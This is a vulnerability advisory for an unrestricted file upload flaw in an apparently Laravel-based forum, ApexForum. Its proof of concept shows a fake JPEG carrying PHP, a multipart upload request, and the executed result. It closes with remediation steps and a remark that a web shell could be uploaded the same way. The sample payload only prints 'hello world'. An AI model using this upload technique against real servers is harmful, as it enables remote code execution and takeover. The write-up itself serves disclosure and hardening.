# üì§ ApexForum - Arbitrary File Upload to Remote Code Execution (RCE)

üìå **Product Information**  
**Platform**: Laravel  
**Affected Feature**: File Upload Endpoint  
**Tested Vulnerability**: Unrestricted File Upload (PHP Code Execution)

**CWE ID**: CWE-434  
**CWE Name**: Unrestricted Upload of File with Dangerous Type  
**Patched**: ‚ùå Not Applicable  
**Patch Priority**: üî¥ High

‚ö†Ô∏è **Summary of the Vulnerability**  
The `upload` endpoint in ApexForum's Laravel application fails to properly validate uploaded files. Attackers can upload arbitrary files with embedded PHP code by disguising them as images, which the server stores in a publicly accessible directory.  
When accessed, the uploaded PHP file executes on the server, resulting in **Remote Code Execution (RCE)**.

---

## üß™ Proof of Concept (PoC)  

### ‚û§ Step 1 - Craft Malicious Image with Embedded PHP
Example payload (`bq.jpg`):
```php
√ø√ò√ø√†<?php echo 'hello world'; ?>
```

### ‚û§ Step 2 - Upload via Vulnerable Endpoint
```http

Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="image"; filename="bq.jpg"
Content-Type: image/jpeg

√ø√ò√ø√†<?php echo 'hello world'; ?>
------WebKitFormBoundary--
```

**Response:**
```json
{
  "status":200,
  "url":"https:\/\/localhost\/public\/uploads\/trumbowyg\/20fd17f01763a1130306e93ee0015250.php"
}
```

---

### ‚û§ Step 3 - Trigger the Payload
Access:
```
https://localhost/public/uploads/trumbowyg/20fd17f01763a1130306e93ee0015250.php
```
**Output:**
```
hello world
```

‚úÖ **Indicators of Success**:
- Server accepts `.php` files.
- Payload is executed upon visiting the file URL.
- Full RCE is possible.

---

## üîç Where‚Äôs the Flaw?
- No server-side MIME type or extension validation.
- No file content scanning to detect embedded PHP.
- Upload directory is publicly accessible and executes `.php` files.

---

## üîê Recommendation
- Restrict allowed file types/extensions server-side (e.g., `.jpg`, `.png`, `.gif` only).
- Validate MIME type and file signature (magic bytes).
- Store uploads outside the web root or serve them via a non-executable handler.
- Configure web server to prevent execution of scripts in the upload directory.
- Sanitize file names and paths.

---

## ‚öôÔ∏è Optional Automation Features
An automated exploit could:
- Craft a PHP web shell disguised as an image.
- Access the uploaded file to execute commands remotely.
